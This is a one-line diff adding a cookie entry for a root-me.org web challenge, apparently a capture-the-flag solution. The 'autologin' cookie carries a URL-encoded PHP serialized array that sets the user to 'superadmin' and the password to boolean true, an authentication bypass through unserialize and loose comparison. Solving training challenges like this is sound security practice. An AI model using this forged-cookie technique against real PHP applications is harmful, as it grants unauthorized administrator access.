@@ -1,0 +1,1 @@
+challenge01.root-me.org	FALSE	/web-serveur/ch28/	FALSE	0	autologin	a%3A2%3A%7Bs%3A5%3A%22login%22%3Bs%3A10%3A%22superadmin%22%3Bs%3A8%3A%22password%22%3Bb%3A1%3B%7D
